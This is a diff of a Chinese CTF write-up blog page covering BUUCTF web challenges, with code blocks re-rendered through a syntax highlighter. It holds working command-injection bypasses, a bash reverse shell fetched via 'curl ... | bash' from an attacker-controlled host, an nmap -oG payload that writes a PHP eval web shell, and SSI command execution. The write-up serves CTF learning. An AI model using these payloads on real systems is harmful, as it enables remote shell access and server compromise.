+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"
+"</span><span class="token punctuation">;</span>
+  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-?&gt; </code></pre>
+<span class="token operator">?</span><span class="token operator">></span> </code></pre>
 
 <p>发现大多数符号都被过滤，以下几种方法都不行（不过好像都挺有用的，搬来学习一下）：</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">cat fl* 利用*匹配任意 不行
-echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash 也不行
-ca\t fl\ag.php 不行
-cat fl&#39;&#39;ag.php 不行</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">cat</span> fl* 利用*匹配任意 不行
+<span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IGZsYWcucGhw"</span><span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">bash</span> 也不行
+ca<span class="token punctuation">\</span>t fl<span class="token punctuation">\</span>ag.php 不行
+<span class="token function">cat</span> fl<span class="token string">''</span>ag.php 不行</code></pre>
 
 <p>最后使用变量拼接：</p>
 <p>顾名思义，变量拼接就是：a=f;b=lag.php;cat $a$b</p>
 <p>利用到解题中：</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">a&#x3D;g;cat$IFS$1fla$a.php</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">a</span><span class="token operator">=</span>g<span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$1fla</span><span class="token variable">$a</span>.php</code></pre>
 
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt loading="lazy"></p>
 <p>[・_・?]</p>
@@ -118,47 +118,47 @@ cat fl&#39;&#39;ag.php 不行</code></pre>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt loading="lazy"></p>
 <p>.swp源码泄露，是使用vim编辑器的缓存文件</p>
 <p>于是访问<code>url/.index.php.swp</code>下载该文件，然后用<code>vim -r index.php.swp</code>恢复文件，得到源码</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;!DOCTYPE html&gt;
-&lt;html lang&#x3D;&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
-    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;
-&lt;&#x2F;head&gt;
-&lt;body&gt;
-    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;
-&lt;&#x2F;body&gt;
-&lt;&#x2F;html&gt;
-&lt;?php
-error_reporting(0);
-echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;
-if (!isset($_POST[&#39;girl_friend&#39;])) &#123;
-    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);
-&#125; else &#123;
-    $girl &#x3D; $_POST[&#39;girl_friend&#39;];
-    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;
-        die(&#39;just girl&#39;);
-    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;
-        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;
-    &#125; else &#123;
-        &#x2F;&#x2F;duangShell~~~~
-        exec($girl);
-    &#125;
-&#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>give me a girl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>珍爱网<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">"how can i give you source code? .swp?!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"where is P3rh4ps's girl friend ???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$girl</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\>|\\\/'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'just girl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='img/p3_need_beautiful_gf.png'> &lt;!-- He is p3 -->"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">//duangShell~~~~</span>
+        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
 
 <p>代码审计，可以POST一个<code>girl_friend</code>参数但过滤了一些参数，看到最后执行命令使用的是<code>exec</code>的函数，返回最后一行内容，无回显，由于看不到输出，就选择反弹shell来拿到系统权限执行命令。</p>
 <p>正好<code>curl</code>命令没用被禁，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yanguhung/p/10115911.html">curl命令参考</a>，于是选择用<code>curl</code>指令来curl远程主机上的文件然后再用管道符<code>| bash</code>来执行<code>curl</code>下来的内容</p>
 <p>由于<code>buu</code>上面的靶机无法访问外网，创个小号开台可以用的靶机（靶机已经装好了LAMP），由于都是在一个内网，所以靶机之间可以互相访问</p>
 <p><code>ssh</code>登录<code>ssh -p 29722 root@node3.buuoj.cn</code></p>
 <p>输入密码进去后在<code>/var/www/html</code>目录下创建一个<code>txt</code>文件，里面写上反弹shell的语句</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.143.177&#x2F;2333 0&gt;&amp;1</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/174.1.143.177/2333 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
 
 <p>注意上面的ip地址为内网的ip，提前用ifconfig查看一下内网ip就可以了，</p>
 <p>然后在需要反弹shell的机子上post参数：</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">girl_friend&#x3D;curl 174.1.143.177&#x2F;1.txt | bash</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">girl_friend</span><span class="token operator">=</span>curl <span class="token number">174.1</span>.143.177/1.txt <span class="token operator">|</span> <span class="token function">bash</span></code></pre>
 
 <p>可以看到shell被弹过来了，然后开始找flag</p>
 <p>在根目录下有一个flag文件，但里面放的不是flag，于是find+grep查找</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">find</span> etc -name <span class="token string">"*"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"flag&#123;"</span></code></pre>
 
 <p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-xargs.html">xargs</a>，最终在<code>etc</code>中找到了flag</p>
 <p>关于反弹shell的解析参考以下文章</p>
@@ -168,24 +168,24 @@ if (!isset($_POST[&#39;girl_friend&#39;])) &#123;
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/11398877.html">https://www.cnblogs.com/-zhong/p/11398877.html</a>   （Liunx反弹shell的几种方式）</p>
 </blockquote>
 <h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="BUUCTF-2018-Online Tool"></a>BUUCTF-2018-Online Tool</h3><p>首页源码：</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
-if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;
-    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-&#125;
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-if(!isset($_GET[&#39;host&#39;])) &#123;
-    highlight_file(__FILE__);
-&#125; else &#123;
-    $host &#x3D; $_GET[&#39;host&#39;];
-    $host &#x3D; escapeshellarg($host);
-    $host &#x3D; escapeshellcmd($host);
-    $sandbox &#x3D; md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
-    echo &#39;you are in sandbox &#39;.$sandbox;
-    @mkdir($sandbox);
-    chdir($sandbox);
-    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
-&#125;</code></pre>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
+    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span></code></pre>
 
 <p>可以<code>get</code>一个<code>host</code></p>
 <ul>
@@ -196,26 +196,26 @@ if(!isset($_GET[&#39;host&#39;])) &#123;
 <p>于是我们配合<code>nmap</code>的<code>-oG</code>参数可以将扫描的结果生成指定的文件</p>
 <p><code>payload</code>：<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>
 <h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="GKCTF2020-CheckIN"></a>GKCTF2020-CheckIN</h3><p>首先题目给出了源码：</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;title&gt;Check_In&lt;&#x2F;title&gt;
-&lt;?php 
-highlight_file(__FILE__);
-class ClassName
-&#123;
-        public $code &#x3D; null;
-        public $decode &#x3D; null;
-        function __construct()
-        &#123;
-                $this-&gt;code &#x3D; @$this-&gt;x()[&#39;Ginkgo&#39;];
-                $this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );
-                @Eval($this-&gt;decode);
-        &#125;
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Check_In<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">ClassName</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+                @<span class="token keyword">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
 
-        public function x()
-        &#123;
-                return $_REQUEST;
-        &#125;
-&#125;
-new ClassName();</code></pre>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
 
 <p>可以看到已经相当于有一个马在上面了， <code>@Eval(base64_decode($_REQUEST[&#39;Ginkgo&#39;]));</code></p>
 <p>于是直接用蚁剑连接：</p>
@@ -234,51 +234,51 @@ new ClassName();</code></pre>
 <p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<code>&lt;!--#exec cmd=”id” --&gt;</code>语法执行命令。</p>
 <p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
 <p>index.php.swp源码泄露，访问得到源码</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-	ob_start();
-	function get_hash()&#123;
-		$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;
-		$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times
-		$content &#x3D; uniqid().$random;
-		return sha1($content); 
-	&#125;
-    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);
-	***
-    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )
-    &#123;
-        $admin &#x3D; &#39;6d0bc1&#39;;
-        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;
-            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;
-            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;
-            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
-            $text &#x3D; &#39;
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>
+		<span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span>
+		<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+	<span class="token punctuation">&#125;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
+            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>
+            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'
             ***
             ***
-            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;
+            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>
             ***
-			***&#39;;
-            fwrite($shtml,$text);
-            fclose($shtml);
-            ***
-			echo &quot;[!] Header  error ...&quot;;
-        &#125; else &#123;
-            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;
+			***'</span><span class="token punctuation">;</span>
+            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">**</span><span class="token operator">*</span>
+			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>
             
-    &#125;else
-    &#123;
-	***
-    &#125;
-	***
-?&gt;</code></pre>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+    <span class="token punctuation">&#125;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+<span class="token delimiter important">?></span></span></code></pre>
 
 <p>首先需要绕过<code>if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6))</code></p>
 <p>写个简单的脚本</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-for($i &#x3D; 0;$i &lt; 9999999; $i++)&#123;
-    if(substr(md5($i),0,6) &#x3D;&#x3D; &#39;6d0bc1&#39;)&#123;
-        print($i.&quot;\n&quot;);
-    &#125;
-&#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
